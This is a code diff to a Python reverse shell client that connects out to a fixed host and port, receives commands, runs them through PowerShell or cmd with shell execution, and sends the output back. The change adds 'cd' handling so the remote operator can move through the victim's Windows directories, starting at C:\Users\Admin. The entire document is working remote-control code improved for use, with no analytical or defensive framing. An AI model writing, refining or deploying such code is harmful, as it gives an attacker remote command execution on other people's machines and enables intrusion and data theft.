@@ -1,14 +1,17 @@
 import socket
 import subprocess
+import os
 
 HOST = '192.168.50.39'
 PORT = 9999
 
 mode = "ps"
+cwd = os.path.expanduser("C:\\Users\\Admin")  # default directory
 
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     s.connect((HOST, PORT))
+
     while True:
         data = s.recv(4096)
         if not data:
@@ -25,30 +28,46 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             continue
 
         try:
+            if command.lower().startswith("cd"):
+                parts = command.split(maxsplit=1)
+                if len(parts) == 2:
+                    new_path = parts[1].strip('"')
+                    new_path = new_path.replace("/", "\\")
+                    if new_path == "..":
+                        cwd = os.path.dirname(cwd)
+                    else:
+                        combined = os.path.abspath(os.path.join(cwd, new_path))
+                        if os.path.isdir(combined):
+                            cwd = combined
+                        else:
+                            raise FileNotFoundError(f"The system cannot find the path specified: {combined}")
+                # After cd, just return new prompt
+                prompt = cwd + "> "
+                s.sendall(prompt.encode())
+                continue
+
+            # Run command in tracked directory
             if mode == "ps":
-                # Run command and capture both output and working directory
-                prompt = subprocess.check_output(
-                    ["powershell.exe", "-NoProfile", "-Command", "(Get-Location).Path"],
-                    stderr=subprocess.STDOUT,
-                    text=True
-                ).strip()
                 output = subprocess.check_output(
                     ["powershell.exe", "-NoProfile", "-Command", command],
                     stderr=subprocess.STDOUT,
-                    text=True
+                    text=True,
+                    cwd=cwd
                 )
-                full_output = f"{prompt}> {command}\n{output}"
             else:
-                # CMD mode
-                prompt = subprocess.check_output("cd", shell=True, text=True).strip()
                 output = subprocess.check_output(
                     command,
                     shell=True,
                     stderr=subprocess.STDOUT,
-                    text=True
+                    text=True,
+                    cwd=cwd
                 )
-                full_output = f"{prompt}> {command}\n{output}"
+
+            full_output = f"{cwd}> {command}\n{output}"
+
         except subprocess.CalledProcessError as e:
-            full_output = f"{prompt}> {command}\n{e.output}"
+            full_output = f"{cwd}> {command}\n{e.output}"
+        except FileNotFoundError as e:
+            full_output = f"{cwd}> {command}\n{str(e)}"
 
         s.sendall(full_output.encode())
